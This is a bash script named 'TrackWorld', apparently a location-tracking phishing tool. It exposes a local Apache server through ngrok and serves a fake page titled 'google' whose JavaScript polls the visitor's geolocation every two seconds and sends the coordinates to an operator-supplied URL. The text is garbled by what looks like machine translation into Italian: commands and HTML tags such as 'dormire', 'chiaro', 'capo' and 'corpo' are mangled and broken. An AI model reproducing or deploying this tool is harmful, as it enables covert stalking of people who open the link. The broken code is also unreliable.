# TrackWorld
#! / bin / bash

# 64-bit
# xterm -e ./ngrok_64 http 80 e chiaro

# 32-bit
xterm -e ./ngrok http 80 e chiaro


echo  "             ______________________________________________________
                                  Anonymo0001
dormire 5
read -p 'URL:' varurl
echo " < ! DOCTYPE html >
< html >
   < capo >
      < title > google < / title >
      < style type = \ " text / css \" >
         corpo {
         background-image: url ( \ " mondo.jpg \" ) ;
         dimensione di sfondo: 1000px 1600px ;
         background-repeat: no-repeat ;
         }
      < / style >
   < / head >
   < corpo >
      < script src = \ " https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js \" > </ script >
      < script >
         function  httpGet (theUrl) {
             var xmlHttp = new XMLHttpRequest ();
             xmlHttp.open ( \ " GET \" , theUrl, false ) ; // false  per la richiesta sincrona
             xmlHttp.send (null) ;
             return xmlHttp.responseText ;
         }

         function  autoUpdate () {
           navigator.geolocation.getCurrentPosition (function (position) {
             coords = position.coords.latitude + \ " , \" + position.coords.longitude ;
              url = \ " " $ varurl " / logme / \" + coords ;
             httpGet (url) ;
             console.log ( ' dovrebbe funzionare ' ) ;
             setTimeout (autoUpdate, 2000) ;
         })
         };
         \ $ (document) .ready (function () {
            autoUpdate ();
         }) ;
      < / script >
   < / body >
< / html > " > index.html
mv index.html /var/www/html/index.html
cp mondo.jpg /var/www/html/mondo.jpg
servizio apache2 start
echo "          ______________________________________________________
                                   Anonymo0001
                                                                  " > /var/log/apache2/access.log
xterm -e tail -f /var/log/apache2/access.log &
chiaro
Uscita
